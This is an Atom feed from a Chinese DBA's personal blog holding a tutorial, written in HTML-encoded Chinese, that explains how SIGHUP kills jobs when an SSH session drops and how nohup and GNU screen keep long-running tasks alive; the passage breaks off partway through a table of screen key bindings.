<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jamin Blog</title>
  <icon>https://www.gravatar.com/avatar/fca0f49342f608d216999d4b41d5ba65</icon>
  <subtitle>一个不聊技术的 DBA 不是一个好厨子...</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jiemin.wang/"/>
  <updated>2019-04-02T11:04:10.233Z</updated>
  <id>https://jiemin.wang/</id>
  
  <author>
    <name>Wang Jiemin</name>
    <email>278667010@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux 技巧：使用 screen 管理你的远程会话</title>
    <link href="https://jiemin.wang/2019/04/02/linux-screen/"/>
    <id>https://jiemin.wang/2019/04/02/linux-screen/</id>
    <published>2019-04-02T10:33:06.000Z</published>
    <updated>2019-04-02T11:04:10.233Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>&#x6709;&#x672C;&#x4E8B;&#xFF0C;&#x4F60;&#x6765;&#x987A;&#x7740;&#x7F51;&#x7EBF;&#x722C;&#x8FC7;&#x6765;&#xFF0C;&#x4F60;&#x6765;&#x54AC;&#x6211;&#x5440;</strong></p></blockquote><h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x4F60;&#x662F;&#x4E0D;&#x662F;&#x7ECF;&#x5E38;&#x9700;&#x8981; SSH &#x6216;&#x8005; telent &#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x5230; Linux &#x670D;&#x52A1;&#x5668;&#xFF1F;&#x4F60;&#x662F;&#x4E0D;&#x662F;&#x7ECF;&#x5E38;&#x4E3A;&#x4E00;&#x4E9B;&#x957F;&#x65F6;&#x95F4;&#x8FD0;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x800C;&#x5934;&#x75BC;&#xFF0C;&#x6BD4;&#x5982;&#x7CFB;&#x7EDF;&#x5907;&#x4EFD;&#x3001;ftp &#x4F20;&#x8F93;&#x7B49;&#x7B49;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x6211;&#x4EEC;&#x90FD;&#x662F;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x4EFB;&#x52A1;&#x5F00;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x7EC8;&#x7AEF;&#x7A97;&#x53E3;&#xFF0C;&#x56E0;&#x4E3A;&#x4ED6;&#x4EEC;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x592A;&#x957F;&#x4E86;&#x3002;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x5B83;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#xFF0C;&#x5728;&#x6B64;&#x671F;&#x95F4;&#x53EF;&#x4E0D;&#x80FD;&#x5173;&#x6389;&#x7A97;&#x53E3;&#x6216;&#x8005;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x5426;&#x5219;&#x8FD9;&#x4E2A;&#x4EFB;&#x52A1;&#x5C31;&#x4F1A;&#x88AB;&#x6740;&#x6389;&#xFF0C;&#x4E00;&#x5207;&#x534A;&#x9014;&#x800C;&#x5E9F;&#x4E86;&#x3002;</p><h4 id="&#x5143;&#x51F6;&#xFF1A;SIGHUP-&#x4FE1;&#x53F7;"><a href="#&#x5143;&#x51F6;&#xFF1A;SIGHUP-&#x4FE1;&#x53F7;" class="headerlink" title="&#x5143;&#x51F6;&#xFF1A;SIGHUP &#x4FE1;&#x53F7;"></a>&#x5143;&#x51F6;&#xFF1A;SIGHUP &#x4FE1;&#x53F7;</h4><p>&#x8BA9;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x4E3A;&#x4EC0;&#x4E48;&#x5173;&#x6389;&#x7A97;&#x53E3;/&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x4F1A;&#x4F7F;&#x5F97;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#x6B7B;&#x6389;&#x3002;</p><p>&#x5728;Linux/Unix&#x4E2D;&#xFF0C;&#x6709;&#x8FD9;&#x6837;&#x51E0;&#x4E2A;&#x6982;&#x5FF5;:</p><ul><li>&#x8FDB;&#x7A0B;&#x7EC4;&#xFF08;process group&#xFF09;&#xFF1A;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7EC4;&#x6709;&#x552F;&#x4E00;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7EC4;ID&#xFF0C;&#x5373;&#x8FDB;&#x7A0B;&#x7EC4;&#x957F;&#x8FDB;&#x7A0B;&#x7684;ID&#x3002;</li><li>&#x4F1A;&#x8BDD;&#x671F;&#xFF08;session&#xFF09;&#xFF1A;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x7EC4;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x6709;&#x552F;&#x4E00;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x671F;&#x9996;&#x8FDB;&#x7A0B;&#xFF08;session leader&#xFF09;&#x3002;&#x4F1A;&#x8BDD;&#x671F;ID&#x4E3A;&#x9996;&#x8FDB;&#x7A0B;&#x7684;ID&#x3002;</li><li>&#x4F1A;&#x8BDD;&#x671F;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x63A7;&#x5236;&#x7EC8;&#x7AEF;&#xFF08;controlling terminal&#xFF09;&#x3002;&#x4E0E;&#x63A7;&#x5236;&#x7EC8;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;&#x4F1A;&#x8BDD;&#x671F;&#x9996;&#x8FDB;&#x7A0B;&#x53EB;&#x505A;&#x63A7;&#x5236;&#x8FDB;&#x7A0B;&#xFF08;controlling process&#xFF09;&#x3002;&#x5F53;&#x524D;&#x4E0E;&#x7EC8;&#x7AEF;&#x4EA4;&#x4E92;&#x7684;&#x8FDB;&#x7A0B;&#x79F0;&#x4E3A;&#x524D;&#x53F0;&#x8FDB;&#x7A0B;&#x7EC4;&#x3002;&#x5176;&#x4F59;&#x8FDB;&#x7A0B;&#x7EC4;&#x79F0;&#x4E3A;&#x540E;&#x53F0;&#x8FDB;&#x7A0B;&#x7EC4;&#x3002;</li></ul><p>&#x6839;&#x636E;POSIX.1&#x5B9A;&#x4E49;:</p><ul><li>&#x6302;&#x65AD;&#x4FE1;&#x53F7;&#xFF08;SIGHUP&#xFF09;&#x9ED8;&#x8BA4;&#x7684;&#x52A8;&#x4F5C;&#x662F;&#x7EC8;&#x6B62;&#x7A0B;&#x5E8F;&#x3002;</li><li>&#x5F53;&#x7EC8;&#x7AEF;&#x63A5;&#x53E3;&#x68C0;&#x6D4B;&#x5230;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x65AD;&#x5F00;&#xFF0C;&#x5C06;&#x6302;&#x65AD;&#x4FE1;&#x53F7;&#x53D1;&#x9001;&#x7ED9;&#x63A7;&#x5236;&#x8FDB;&#x7A0B;&#xFF08;&#x4F1A;&#x8BDD;&#x671F;&#x9996;&#x8FDB;&#x7A0B;&#xFF09;&#x3002;</li><li>&#x5982;&#x679C;&#x4F1A;&#x8BDD;&#x671F;&#x9996;&#x8FDB;&#x7A0B;&#x7EC8;&#x6B62;&#xFF0C;&#x5219;&#x8BE5;&#x4FE1;&#x53F7;&#x53D1;&#x9001;&#x5230;&#x8BE5;&#x4F1A;&#x8BDD;&#x671F;&#x524D;&#x53F0;&#x8FDB;&#x7A0B;&#x7EC4;&#x3002;</li><li>&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x9000;&#x51FA;&#x5BFC;&#x81F4;&#x4E00;&#x4E2A;&#x5B64;&#x513F;&#x8FDB;&#x7A0B;&#x7EC4;&#x4E2D;&#x4EA7;&#x751F;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x5B64;&#x513F;&#x8FDB;&#x7A0B;&#x7EC4;&#x8FDB;&#x7A0B;&#x5904;&#x4E8E;STOP&#x72B6;&#x6001;&#xFF0C;&#x53D1;&#x9001;SIGHUP&#x548C;SIGCONT&#x4FE1;&#x53F7;&#x5230;&#x8BE5;&#x8FDB;&#x7A0B;&#x7EC4;&#x4E2D;&#x6240;&#x6709;&#x8FDB;&#x7A0B;&#x3002;</li></ul><p>&#x56E0;&#x6B64;&#x5F53;&#x7F51;&#x7EDC;&#x65AD;&#x5F00;&#x6216;&#x7EC8;&#x7AEF;&#x7A97;&#x53E3;&#x5173;&#x95ED;&#x540E;&#xFF0C;&#x63A7;&#x5236;&#x8FDB;&#x7A0B;&#x6536;&#x5230;SIGHUP&#x4FE1;&#x53F7;&#x9000;&#x51FA;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x8BE5;&#x4F1A;&#x8BDD;&#x671F;&#x5185;&#x5176;&#x4ED6;&#x8FDB;&#x7A0B;&#x9000;&#x51FA;&#x3002;</p><p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#x3002;&#x6253;&#x5F00;&#x4E24;&#x4E2A;SSH&#x7EC8;&#x7AEF;&#x7A97;&#x53E3;&#xFF0C;&#x5728;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;top&#x547D;&#x4EE4;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># top</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x7EC8;&#x7AEF;&#x7A97;&#x53E3;&#xFF0C;&#x627E;&#x5230;top&#x7684;&#x8FDB;&#x7A0B;ID&#x4E3A;15371&#xFF0C;&#x5176;&#x7236;&#x8FDB;&#x7A0B;ID&#x4E3A;10034&#xFF0C;&#x5373;&#x767B;&#x5F55;shell&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># ps -ef|grep top</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root         5     2  0 Apr01 ?        00:00:00 [stopper/0]</span><br><span class="line">root         8     2  0 Apr01 ?        00:00:00 [stopper/1]</span><br><span class="line">root     15371 10034  0 18:37 pts/1    00:00:00 top</span><br><span class="line">root     15380 15352  0 18:37 pts/2    00:00:00 grep --colour=auto top</span><br><span class="line">test_dbs2 ~ <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>&#x4F7F;&#x7528;pstree&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x66F4;&#x6E05;&#x695A;&#x5730;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x5173;&#x7CFB;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># pstree -H 15371|grep top    </span></span><br><span class="line">     |      |-sshd---sshd---bash---sudo---bash---sudo---bash---top</span><br><span class="line">test_dbs2 ~ <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;ps-xj&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x767B;&#x5F55;shell&#xFF08;PID 15371&#xFF09;&#x548C;top&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x671F;&#xFF0C;shell&#x4E3A;&#x4F1A;&#x8BDD;&#x671F;&#x9996;&#x8FDB;&#x7A0B;&#xFF0C;&#x6240;&#x5728;&#x8FDB;&#x7A0B;&#x7EC4;PGID&#x4E3A;15371&#xFF0C;top&#x6240;&#x5728;&#x8FDB;&#x7A0B;&#x7EC4;PGID&#x4E3A;9410&#xFF0C;&#x4E3A;&#x524D;&#x53F0;&#x8FDB;&#x7A0B;&#x7EC4;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># ps -xj|grep 15371</span></span><br><span class="line">Warning: bad syntax, perhaps a bogus <span class="string">&apos;-&apos;</span>? See /usr/share/doc/procps-3.2.8/FAQ</span><br><span class="line"> 9410 10020 10020  9410 pts/1    15371 S        0   0:00 sudo bash</span><br><span class="line">10020 10021 10021  9410 pts/1    15371 S        0   0:00 bash</span><br><span class="line">10021 10033 10033  9410 pts/1    15371 S        0   0:00 sudo bash</span><br><span class="line">10033 10034 10034  9410 pts/1    15371 S        0   0:00 bash</span><br><span class="line">10034 15371 15371  9410 pts/1    15371 S+       0   0:00 top</span><br><span class="line">15352 15485 15484 15327 pts/2    15484 R+       0   0:00 grep --colour=auto 15371</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5173;&#x95ED;&#x7B2C;&#x4E00;&#x4E2A;SSH&#x7A97;&#x53E3;&#xFF0C;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x7A97;&#x53E3;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;top&#x4E5F;&#x88AB;&#x6740;&#x6389;&#x4E86;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># ps -ef|grep 15371</span></span><br><span class="line">root     15511 15352  0 18:42 pts/2    00:00:00 grep --colour=auto 15371</span><br><span class="line">test_dbs2 ~ <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;SIGHUP&#x4FE1;&#x53F7;&#xFF0C;&#x5173;&#x6389;&#x7A97;&#x53E3;&#x5E94;&#x8BE5;&#x5C31;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#x4E86;&#x3002;nohup&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x7684;&#x6807;&#x51C6;&#x8F93;&#x51FA;/&#x6807;&#x51C6;&#x9519;&#x8BEF;&#x662F;&#x7EC8;&#x7AEF;&#xFF0C;nohup&#x9ED8;&#x8BA4;&#x5C06;&#x5176;&#x91CD;&#x5B9A;&#x5411;&#x5230;nohup.out&#x6587;&#x4EF6;&#x3002;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;nohup&#x547D;&#x4EE4;&#x53EA;&#x662F;&#x4F7F;&#x5F97;&#x7A0B;&#x5E8F;&#x5FFD;&#x7565;SIGHUP&#x4FE1;&#x53F7;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6807;&#x8BB0;&amp;&#x628A;&#x5B83;&#x653E;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup &lt;<span class="built_in">command</span>&gt; [argument&#x2026;] &amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;nohup&#x5F88;&#x5BB9;&#x6613;&#x4F7F;&#x7528;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x201C;&#x7B80;&#x964B;&#x201D;&#x7684;&#xFF0C;&#x5BF9;&#x4E8E;&#x7B80;&#x5355;&#x7684;&#x547D;&#x4EE4;&#x80FD;&#x591F;&#x5E94;&#x4ED8;&#x8FC7;&#x6765;&#xFF0C;&#x5BF9;&#x4E8E;&#x590D;&#x6742;&#x7684;&#x9700;&#x8981;&#x4EBA;&#x673A;&#x4EA4;&#x4E92;&#x7684;&#x4EFB;&#x52A1;&#x5C31;&#x9EBB;&#x70E6;&#x4E86;&#x3002;</p><p>&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x66F4;&#x4E3A;&#x5F3A;&#x5927;&#x7684;&#x5B9E;&#x7528;&#x7A0B;&#x5E8F;screen&#x3002;&#x6D41;&#x884C;&#x7684;Linux&#x53D1;&#x884C;&#x7248;&#xFF08;&#x4F8B;&#x5982;Red Hat Enterprise Linux &#xFF09;</p><p>&#x901A;&#x5E38;&#x4F1A;&#x81EA;&#x5E26;screen&#x5B9E;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;<a href="https://www.gnu.org/software/screen/" target="_blank" rel="noopener">GNU screen&#x7684;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;</a>&#x4E0B;&#x8F7D;&#x3002;</p><h2 id="&#x5F00;&#x59CB;&#x4F7F;&#x7528;Screen"><a href="#&#x5F00;&#x59CB;&#x4F7F;&#x7528;Screen" class="headerlink" title="&#x5F00;&#x59CB;&#x4F7F;&#x7528;Screen"></a>&#x5F00;&#x59CB;&#x4F7F;&#x7528;Screen</h2><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;Screen&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x5728;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x591A;&#x8DEF;&#x590D;&#x7528;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x7EC8;&#x7AEF;&#x7684;&#x7A97;&#x53E3;&#x7BA1;&#x7406;&#x5668;&#x3002;Screen&#x4E2D;&#x6709;&#x4F1A;&#x8BDD;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x4E2A;screen&#x4F1A;&#x8BDD;&#x4E2D;&#x521B;&#x5EFA;&#x591A;&#x4E2A;screen&#x7A97;&#x53E3;&#xFF0C;&#x5728;&#x6BCF;&#x4E00;&#x4E2A;screen&#x7A97;&#x53E3;&#x4E2D;&#x5C31;&#x50CF;&#x64CD;&#x4F5C;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;telnet/SSH&#x8FDE;&#x63A5;&#x7A97;&#x53E3;&#x90A3;&#x6837;&#x3002;&#x5728;screen&#x4E2D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7A97;&#x53E3;&#x6709;&#x8FD9;&#x6837;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># yum install -y screen</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># </span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen --help</span></span><br><span class="line">Use: screen [-opts] [cmd [args]]</span><br><span class="line"> or: screen -r [host.tty]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-4            Use IPv4.</span><br><span class="line">-6            Use IPv6.</span><br><span class="line">-a            Force all capabilities into each window<span class="string">&apos;s termcap.</span></span><br><span class="line"><span class="string">-A -[r|R]     Adapt all windows to the new display width &amp; height.</span></span><br><span class="line"><span class="string">-c file       Read configuration file instead of &apos;</span>.screenrc<span class="string">&apos;.</span></span><br><span class="line"><span class="string">-d (-r)       Detach the elsewhere running screen (and reattach here).</span></span><br><span class="line"><span class="string">-dmS name     Start as daemon: Screen session in detached mode.</span></span><br><span class="line"><span class="string">-D (-r)       Detach and logout remote (and reattach here).</span></span><br><span class="line"><span class="string">-D -RR        Do whatever is needed to get a screen session.</span></span><br><span class="line"><span class="string">-e xy         Change command characters.</span></span><br><span class="line"><span class="string">-f            Flow control on, -fn = off, -fa = auto.</span></span><br><span class="line"><span class="string">-h lines      Set the size of the scrollback history buffer.</span></span><br><span class="line"><span class="string">-i            Interrupt output sooner when flow control is on.</span></span><br><span class="line"><span class="string">-l            Login mode on (update /var/run/utmp), -ln = off.</span></span><br><span class="line"><span class="string">-list         or -ls. Do nothing, just list our SockDir.</span></span><br><span class="line"><span class="string">-L            Turn on output logging.</span></span><br><span class="line"><span class="string">-m            ignore $STY variable, do create a new screen session.</span></span><br><span class="line"><span class="string">-O            Choose optimal output rather than exact vt100 emulation.</span></span><br><span class="line"><span class="string">-p window     Preselect the named window if it exists.</span></span><br><span class="line"><span class="string">-q            Quiet startup. Exits with non-zero return code if unsuccessful.</span></span><br><span class="line"><span class="string">-r            Reattach to a detached screen process.</span></span><br><span class="line"><span class="string">-R            Reattach if possible, otherwise start a new session.</span></span><br><span class="line"><span class="string">-s shell      Shell to execute rather than $SHELL.</span></span><br><span class="line"><span class="string">-S sockname   Name this session &lt;pid&gt;.sockname instead of &lt;pid&gt;.&lt;tty&gt;.&lt;host&gt;.</span></span><br><span class="line"><span class="string">-t title      Set title. (window&apos;</span>s name).</span><br><span class="line">-T term       Use term as <span class="variable">$TERM</span> <span class="keyword">for</span> windows, rather than <span class="string">&quot;screen&quot;</span>.</span><br><span class="line">-U            Tell screen to use UTF-8 encoding.</span><br><span class="line">-v            Print <span class="string">&quot;Screen version 4.00.03 (FAU) 23-Oct-06&quot;</span>.</span><br><span class="line">-wipe         Do nothing, just clean up SockDir.</span><br><span class="line">-x            Attach to a not detached screen. (Multi display mode).</span><br><span class="line">-X            Execute &lt;cmd&gt; as a screen <span class="built_in">command</span> <span class="keyword">in</span> the specified session.</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x952E;&#x5165;screen&#x547D;&#x4EE4;"><a href="#&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x952E;&#x5165;screen&#x547D;&#x4EE4;" class="headerlink" title="&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x952E;&#x5165;screen&#x547D;&#x4EE4;"></a>&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x952E;&#x5165;screen&#x547D;&#x4EE4;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen</span></span><br></pre></td></tr></tbody></table></figure><p>&#x6216;&#x8005;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x540D;&#x79F0;&#x4E3A;mysqldump<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen -S mysqldump</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x60F3;&#x6682;&#x65F6;&#x9000;&#x51FA;&#x505A;&#x70B9;&#x522B;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x6BD4;&#x5982;&#x51FA;&#x53BB;&#x6563;&#x6563;&#x6B65;&#xFF0C;&#x90A3;&#x4E48;&#x5728;screen&#x7A97;&#x53E3;&#x952E;&#x5165;C-a d&#xFF0C;Screen&#x4F1A;&#x7ED9;&#x51FA;detached&#x63D0;&#x793A;&#xFF1A;</p><p>&#x6682;&#x65F6;&#x4E2D;&#x65AD;&#x4F1A;&#x8BDD;</p><p>&#x534A;&#x4E2A;&#x5C0F;&#x65F6;&#x4E4B;&#x540E;&#x56DE;&#x6765;&#x4E86;&#xFF0C;&#x627E;&#x5230;&#x8BE5;screen&#x4F1A;&#x8BDD;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen -ls</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#x4F1A;&#x8BDD;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen -r -S mysqldump</span></span><br><span class="line"><span class="comment">#&#x6216;&#x8005;</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen -r 16582</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x770B;&#x770B;&#x51FA;&#x73B0;&#x4EC0;&#x4E48;&#x4E86;&#xFF0C;&#x592A;&#x68D2;&#x4E86;&#xFF0C;&#x4E00;&#x5207;&#x90FD;&#x5728;&#x3002;&#x7EE7;&#x7EED;&#x5E72;&#x5427;&#x3002;</p><p>&#x4F60;&#x53EF;&#x80FD;&#x6CE8;&#x610F;&#x5230;&#x7ED9;screen&#x53D1;&#x9001;&#x547D;&#x4EE4;&#x4F7F;&#x7528;&#x4E86;&#x7279;&#x6B8A;&#x7684;&#x952E;&#x7EC4;&#x5408;C-a&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5728;&#x952E;&#x76D8;&#x4E0A;&#x952E;&#x5165;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x76F4;&#x63A5;&#x53D1;&#x9001;&#x7ED9;&#x5F53;&#x524D;screen&#x7A97;&#x53E3;&#xFF0C;&#x5FC5;&#x987B;&#x7528;&#x5176;&#x4ED6;&#x65B9;&#x5F0F;&#x5411;screen&#x7A97;&#x53E3;&#x7BA1;&#x7406;&#x5668;&#x53D1;&#x51FA;&#x547D;&#x4EE4;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;screen&#x63A5;&#x6536;&#x4EE5;C-a&#x5F00;&#x59CB;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x8FD9;&#x79CD;&#x547D;&#x4EE4;&#x5F62;&#x5F0F;&#x5728;screen&#x4E2D;&#x53EB;&#x505A;&#x952E;&#x7ED1;&#x5B9A;&#xFF08;key binding&#xFF09;&#xFF0C;C-a&#x53EB;&#x505A;&#x547D;&#x4EE4;&#x5B57;&#x7B26;&#xFF08;command character&#xFF09;&#x3002;</p><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;C-a ?&#x6765;&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x952E;&#x7ED1;&#x5B9A;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x952E;&#x7ED1;&#x5B9A;&#x6709;&#xFF1A;</p><table><thead><tr><th style="text-align:center">C-a ?</th><th style="text-align:center">&#x663E;&#x793A;&#x6240;&#x6709;&#x952E;&#x7ED1;&#x5B9A;&#x4FE1;&#x606F;</th></tr></thead><tbody><tr><td style="text-align:center">C-a w</td><td style="text-align:center">&#x663E;&#x793A;&#x6240;&#x6709;&#x7A97;&#x53E3;&#x5217;&#x8868;</td></tr><tr><td style="text-align:center">C-a C-a</td><td style="text-align:center">&#x5207;&#x6362;&#x5230;&#x4E4B;&#x524D;&#x663E;&#x793A;&#x7684;&#x7A97;&#x53E3;</td></tr><tr><td style="text-align:center">C-a c</td><td style="text-align:center">&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8FD0;&#x884C;shell&#x7684;&#x7A97;&#x53E3;&#x5E76;&#x5207;&#x6362;&#x5230;&#x8BE5;&#x7A97;&#x53E3;</td></tr><tr><td style="text-align:center">C-a n</td><td 